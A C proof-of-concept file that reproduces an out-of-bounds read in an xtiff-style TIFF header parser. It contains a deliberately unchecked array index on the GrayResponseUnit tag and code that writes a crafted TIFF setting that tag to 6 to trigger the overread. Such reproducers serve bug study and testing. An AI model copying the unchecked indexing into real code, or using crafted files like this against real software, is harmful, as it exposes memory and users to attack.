#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include <tiffio.h>

// Minimal globals mirroring the vulnerable code's expectations
static TIFF *tfFile = NULL;
static const char *fileName = NULL;
static uint16_t tfDirectory = 0;

static uint32_t tfImageWidth = 0;
static uint32_t tfImageHeight = 0;
static uint16_t tfBitsPerSample = 0;
static uint16_t tfSamplesPerPixel = 0;
static uint16_t tfPlanarConfiguration = 0;
static uint16_t tfGrayResponseUnit = 0;

// The vulnerable mapping array (6 elements: valid indices 0..5)
static const double tfGrayResponseUnitMap[6] = {
    1.0,       // 0
    0.1,       // 1
    0.01,      // 2
    0.001,     // 3
    0.0001,    // 4
    0.00001    // 5
};

// Destination for the mapped value
static double tfUnitMap = 0.0;

// Minimal version of the vulnerable function focusing on the OOB read site.
static void GetTIFFHeader(void)
{
    if (!TIFFSetDirectory(tfFile, tfDirectory)) {
        fprintf(stderr, "xtiff: can't seek to directory %u in %s\n",
                (unsigned)tfDirectory, fileName ? fileName : "(null)");
        exit(1);
    }

    // Fetch some basic tags (width/height not strictly needed for the bug)
    TIFFGetField(tfFile, TIFFTAG_IMAGEWIDTH, &tfImageWidth);
    TIFFGetField(tfFile, TIFFTAG_IMAGELENGTH, &tfImageHeight);

    // Fetch defaults for a few tags, including the problematic one
    TIFFGetFieldDefaulted(tfFile, TIFFTAG_BITSPERSAMPLE, &tfBitsPerSample);
    TIFFGetFieldDefaulted(tfFile, TIFFTAG_SAMPLESPERPIXEL, &tfSamplesPerPixel);
    TIFFGetFieldDefaulted(tfFile, TIFFTAG_PLANARCONFIG, &tfPlanarConfiguration);
    TIFFGetFieldDefaulted(tfFile, TIFFTAG_GRAYRESPONSEUNIT, &tfGrayResponseUnit);

    // Vulnerable access: no bounds check on tfGrayResponseUnit
    // If tfGrayResponseUnit > 5, this reads past the end of tfGrayResponseUnitMap
    tfUnitMap = tfGrayResponseUnitMap[tfGrayResponseUnit];

    // Use the value to prevent optimization
    printf("tfGrayResponseUnit=%u, mapped=%f\n", (unsigned)tfGrayResponseUnit, tfUnitMap);
}

static void write_bad_tiff(const char *path)
{
    TIFF *tif = TIFFOpen(path, "w");
    if (!tif) {
        fprintf(stderr, "Failed to create TIFF: %s\n", path);
        exit(1);
    }

    // Minimal, valid 1x1 grayscale image
    TIFFSetField(tif, TIFFTAG_IMAGEWIDTH, (uint32)1);
    TIFFSetField(tif, TIFFTAG_IMAGELENGTH, (uint32)1);
    TIFFSetField(tif, TIFFTAG_BITSPERSAMPLE, (uint16)8);
    TIFFSetField(tif, TIFFTAG_SAMPLESPERPIXEL, (uint16)1);
    TIFFSetField(tif, TIFFTAG_COMPRESSION, COMPRESSION_NONE);
    TIFFSetField(tif, TIFFTAG_PHOTOMETRIC, PHOTOMETRIC_MINISBLACK);
    TIFFSetField(tif, TIFFTAG_PLANARCONFIG, PLANARCONFIG_CONTIG);
    TIFFSetField(tif, TIFFTAG_ROWSPERSTRIP, (uint32)1);

    // Set an invalid GrayResponseUnit value: 6 (valid indices are 0..5)
    // This will cause tfGrayResponseUnitMap[6] (out-of-bounds by 1)
    TIFFSetField(tif, TIFFTAG_GRAYRESPONSEUNIT, (uint16)6);

    uint8_t pixel = 0;
    if (TIFFWriteScanline(tif, &pixel, 0, 0) < 0) {
        fprintf(stderr, "Failed to write scanline\n");
        TIFFClose(tif);
        exit(1);
    }

    TIFFClose(tif);
}

int main(void)
{
    const char *path = "bad_grayunit.tif";
    write_bad_tiff(path);

    fileName = path;
    tfFile = TIFFOpen(fileName, "r");
    if (!tfFile) {
        fprintf(stderr, "Failed to open TIFF for reading: %s\n", fileName);
        return 1;
    }

    // Trigger the vulnerable code path
    GetTIFFHeader();

    TIFFClose(tfFile);

    // Optionally clean up the test file
    // remove(path);

    return 0;
}
